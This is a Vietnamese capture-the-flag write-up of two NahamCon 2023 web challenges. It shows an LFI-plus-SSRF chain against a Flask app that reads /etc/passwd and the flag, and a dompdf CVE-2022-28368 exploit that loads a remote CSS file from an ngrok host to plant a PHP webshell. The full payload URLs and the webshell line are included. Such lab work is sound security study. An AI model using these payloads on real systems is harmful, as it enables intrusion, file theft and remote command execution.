---
title: "NamhamconCTF2023 - webx2"
excerpt: "ğŸ“… Thá»i gian:  Thá»© 6, 16 ThÃ¡ng sÃ¡u 2023, 02:00 ICT â€” Chá»§ nháº­t, 18 ThÃ¡ng sÃ¡u 2023, 02:00 ICT (~GMT +7)
âœ… Rating weight: 24,61
ğŸ’» Official URL: https://ctf.nahamcon.com"
header:
show_date: true
header:
  teaser: "https://hackmd.io/_uploads/HJ7clEssp.png"
  teaser_home_page: true
  icon: "https://hackmd.io/_uploads/By3gJwG0h.png"
categories:
  - CTF
tags:
  - CTF
  - Vietnamese
---

<p align="center">
<img src="https://hackmd.io/_uploads/HJ7clEssp.png">
</p>

# Namhamcon CTF 2023 Web challenge

## MUSEUM
### PhÃ¢n tÃ­ch
![](https://hackmd.io/_uploads/r1wNgksw3.png)

HÃ¬nh chung giao diá»‡n váº«n nhÆ° váº­y khÃ´ng cÃ³ gÃ¬ thay Ä‘á»•i.
MÃ¬nh tháº¥y giao diá»‡n cÃ³ 2 chá»©c nÄƒng chÃ­nh:
- má»™t chá»©c nÄƒng cho phÃ©p submit gÃ¬ Ä‘Ã³, mÃ¬nh Ä‘oÃ¡n lÃ  submit áº£nh.
- xem áº£nh cÅ©

khi xem áº£nh thÃ¬ mÃ¬nh tÃ¬m tháº¥y lá»—i LFI:
http://challenge.nahamcon.com:30548/browse?artifact=angwy.jpg
http://challenge.nahamcon.com:30548/browse?artifact=/./etc/passwd
![](https://hackmd.io/_uploads/SkEZzyovn.png)

oke. cÃ³ thá»ƒ tháº¥y Ä‘Æ°á»£c cÃ³ má»™t user lÃ  museum á»Ÿ Ä‘Ã¢y. ta Ä‘Ã£ biáº¿t trÆ°á»›c Ä‘Ã³, á»©ng dá»¥ng web nÃ y sá»­ dá»¥ng Flask.
trÆ°á»›c máº¯t thÃ¬ mÃ¬nh muá»‘n biáº¿t source code cá»§a á»©ng dá»¥ng web Ä‘Ã£ vÃ¬ chá»©c nÄƒng submit public váº«n cÃ²n Ä‘ang bá»‹ cháº·n mÃ  mÃ¬nh khÃ´ng hiá»ƒu lÃ½ do.
![](https://hackmd.io/_uploads/S1dIXyiv3.png)

thá»­ Ä‘á»c flag. 
![](https://hackmd.io/_uploads/HynrH1jD3.png)
cÃ³ láº½ chuá»—i `flag.txt` Ä‘Ã£ bá»‹ cháº·n

mÃ¬nh Ä‘á»c file `/proc/self/cmdline` Ä‘á»ƒ biáº¿t lá»‡nh Ä‘ang Ä‘Æ°á»£c run.
![](https://hackmd.io/_uploads/S18ENJowh.png)

source code á»©ng dá»¥ng web.
```python
from flask import Flask, request, render_template, send_from_directory, send_file, redirect, url_for
import os
import urllib
import urllib.request

app = Flask(__name__)

@app.route('/')
def index():
    artifacts = os.listdir(os.path.join(os.getcwd(), 'public'))
    return render_template('index.html', artifacts=artifacts)

@app.route("/public/<file_name>")
def public_sendfile(file_name):
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return "Error retrieving file", 404
    return send_file(file_path)

@app.route('/browse', methods=['GET'])
def browse():
    file_name = request.args.get('artifact')

    if not file_name:
        return "Please specify the artifact to view.", 400

    artifact_error = "<h1>Artifact not found.</h1>"

    if ".." in file_name:
        return artifact_error, 404

    if file_name[0] == '/' and file_name[1].isalpha():
        return artifact_error, 404
    
    file_path = os.path.join(os.getcwd(), "public", file_name)
    if not os.path.isfile(file_path):
        return artifact_error, 404

    if 'flag.txt' in file_path:
        return "Sorry, sensitive artifacts are not made visible to the public!", 404

    with open(file_path, 'rb') as f:
        data = f.read()

    image_types = ['jpg', 'png', 'gif', 'jpeg']
    if any(file_name.lower().endswith("." + image_type) for image_type in image_types):
        is_image = True
    else:
        is_image = False

    return render_template('view.html', data=data, filename=file_name, is_image=is_image)

@app.route('/submit')
def submit():
    return render_template('submit.html')

@app.route('/private_submission_fetch', methods=['GET'])
def private_submission_fetch():
    url = request.args.get('url')

    if not url:
        return "URL is required.", 400

    response = submission_fetch(url)
    return response

def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)

@app.route('/private_submission')
def private_submission():
    if request.remote_addr != '127.0.0.1':
        return redirect(url_for('submit'))

    url = request.args.get('url')
    file_name = request.args.get('filename')

    if not url or not file_name:
        return "Please specify a URL and a file name.", 400

    try:
        submission_fetch(url, os.path.join(os.getcwd(), 'public', file_name))
    except Exception as e:
        return str(e), 500

    return "Submission received.", 200

if __name__ == '__main__':
    app.run(debug=False, host="0.0.0.0", port=5000)
```

### PhÃ¢n tÃ­ch source code
Ä‘Ãºng nhÆ° mÃ¬nh nghÄ© chuá»—i `flag.txt` bá»‹ lá»c.
![](https://hackmd.io/_uploads/rk4cSyjw2.png)

![](https://hackmd.io/_uploads/rknaBksvn.png)
Khi má»™t yÃªu cáº§u GET Ä‘Æ°á»£c gá»­i Ä‘áº¿n '/private_submission_fetch', hÃ m private_submission_fetch() Ä‘Æ°á»£c gá»i. Äáº§u tiÃªn, nÃ³ láº¥y giÃ¡ trá»‹ cá»§a tham sá»‘ 'url' tá»« yÃªu cáº§u GET báº±ng cÃ¡ch sá»­ dá»¥ng request.args.get('url'). Náº¿u khÃ´ng tÃ¬m tháº¥y giÃ¡ trá»‹ 'url', nÃ³ sáº½ tráº£ vá» má»™t thÃ´ng bÃ¡o lá»—i "URL is required." vá»›i mÃ£ tráº¡ng thÃ¡i HTTP 400 (Bad Request).

Náº¿u giÃ¡ trá»‹ 'url' Ä‘Æ°á»£c truyá»n vÃ o, hÃ m submission_fetch() Ä‘Æ°á»£c gá»i vá»›i 'url' lÃ m Ä‘á»‘i sá»‘. HÃ m nÃ y sá»­ dá»¥ng thÆ° viá»‡n urllib trong Python Ä‘á»ƒ táº£i xuá»‘ng tá»‡p tá»« 'url'. Káº¿t quáº£ cá»§a hÃ m submission_fetch() Ä‘Æ°á»£c tráº£ vá» tá»« phÆ°Æ¡ng thá»©c 'private_submission_fetch()' vÃ  tráº£ vá» cho ngÆ°á»i dÃ¹ng.

TÃ³m láº¡i, khi má»™t yÃªu cáº§u GET Ä‘Æ°á»£c gá»­i Ä‘áº¿n '/private_submission_fetch' vá»›i tham sá»‘ 'url', á»©ng dá»¥ng web nÃ y sáº½ táº£i xuá»‘ng tá»‡p tá»« 'url' vÃ  tráº£ vá» ná»™i dung tá»‡p Ä‘Ã³ cho ngÆ°á»i dÃ¹ng.

thá»­ fetch tá»›i burp colab:
http://challenge.nahamcon.com:30299/private_submission_fetch?url=http://jj62x6bfitogrjakg8s6nmcqwh28qyen.oastify.com
![](https://hackmd.io/_uploads/H1dEP1jD2.png)
server tráº£ vá» káº¿t quáº£ Internal Server Error nhÆ°ng váº«n cÃ³ request tá»›i colab
nhÆ°ng Ä‘iá»u nÃ y khÃ´ng giÃºp ta Ä‘á»c Ä‘Æ°á»£c ná»™i dung cá»§a file.

![](https://hackmd.io/_uploads/H1p8dkjPn.png)
chÃºng ta cáº§n káº¿t há»£p cáº£ 2 pháº§n nÃ y Ä‘á»ƒ khai thÃ¡c.

hÃ m submission_fetch() Ä‘Æ°á»£c sá»­ dá»¥ng Ä‘á»ƒ táº£i xuá»‘ng má»™t tá»‡p tá»« má»™t Ä‘Æ°á»ng dáº«n URL cung cáº¥p vÃ  tráº£ vá» káº¿t quáº£ táº£i xuá»‘ng Ä‘Ã³.
```python=
def submission_fetch(url, filename=None):
    return urllib.request.urlretrieve(url, filename=filename)
```

path `/private_submission` cho phÃ©p chÃºng ta táº£i xuá»‘ng má»™t file tuy nhiÃªn request pháº£i tá»« localhost má»›i cÃ³ thá»ƒ thá»±c hiá»‡n. ta cÃ³ thá»ƒ bypass nÃ³ báº±ng cÃ¡ch sá»­ dá»¥ng SSRF

### Solution
tá»•ng há»£p láº¡i mÃ¬nh cÃ³ payload nhÆ° sau:
mÃ¬nh sáº½ sá»­ dá»¥ng: http://challenge.nahamcon.com:30299/private_submission_fetch?url=http://127.0.0.1:5000/private_submission?url=file:///flag.txt%26filename=test.txt

upload thÃ nh cÃ´ng:
![](https://hackmd.io/_uploads/r1iKokjwn.png)

xem flag trong file test.txt
![](https://hackmd.io/_uploads/HymjsksD2.png)

flag: `flag{c3d727275bee25a40fae2d2d2fba9d70}`


## Stickers
![](https://hackmd.io/_uploads/B1LSnkiw2.png)

### PhÃ¢n tÃ­ch
á»©ng dá»¥ng web nÃ y cÃ³ chá»©c nÄƒng táº¡o pdf. trang chá»§ cÃ³ má»™t sá»‘ Ä‘áº§u vÃ o trÃ´ng hÆ¡i láº¡ láº¡.

mÃ¬nh tháº¥y cÃ³ má»™t sá»‘ vá»‹ trÃ­ cÃ³ thá»ƒ chÃ¨n
![](https://hackmd.io/_uploads/SyB1pyoDn.png)

 mÃ¬nh sáº½ Ä‘á»ƒ má»™t sá»‘ tÃ i liá»‡u tham kháº£o á»Ÿ Ä‘Ã¢y:
https://www.exploit-db.com/exploits/51270
https://github.com/rvizx/CVE-2022-28368

run PoC Ä‘á»ƒ láº¥y shell lÃ  Ä‘Æ°á»£c :100:  báº¡n cÅ©ng cÃ³ thá»ƒ Ä‘á»c láº¡i cÃ¡ch phÃ¢n tÃ­ch CVE nÃ y á»Ÿ nguá»“n khÃ¡c Ä‘á»ƒ hiá»ƒu chi tiáº¿t.

### Solution
endpoint lÃ  má»™t trong 3 cÃ¡i Qty, chÃ¨n vÃ o cÃ¡i nÃ o cÅ©ng Ä‘Æ°á»£c.

táº¡o file exploit.css nhÆ° nÃ y, thay Ä‘á»•i url phÃ¹ há»£p vá»›i contrainer cá»§a báº¡n:
![](https://hackmd.io/_uploads/r1CD01oPh.png)

thÃªm payload php vÃ o cuá»‘i file exploit_font.php Ä‘á»ƒ táº¡o webshell.
NhÆ° nÃ y: `<?php system("$_GET['cmd']"); ?>`
![](https://hackmd.io/_uploads/Hk330yoP3.png)

táº¡o server web font:
`php -S 0.0.0.0:9001`

chÃ¨n payload Ä‘á»ƒ táº£i font css cho trÃ¬nh táº¡o pdf:
`<link rel=stylesheet href='https://282e-104-28-254-74.ngrok-free.app/exploit.css'>`

fullpaylod: http://challenge.nahamcon.com:31335/quote.php?organisation=test&email=admin%40gmail.com&small=4%3Clink%20rel=stylesheet%20href=%27https://282e-104-28-254-74.ngrok-free.app/exploit.css%27%3E&medium=4&large=4

tÃªn file sáº½ Ä‘Æ°á»£c hash báº±ng md5 vÃ  ná»‘i vá»›i tÃªn font css vÃ  weight css nhÆ° sau:
```
exploitfont_normal_<linkcsshash>
táº¡o hash:

echo -n http://challenge.nahamcon.com:31335//exploit_font.php | md5sum
```

=> `068578d3364c1228150e9c8f8e7b8291`

cuá»‘i cÃ¹ng truy cáº­p link: `/dompdf/lib/fonts/exploitfont_normal_068578d3364c1228150e9c8f8e7b8291.php`

ta sáº½ cÃ³ Ä‘Æ°á»£c webshell
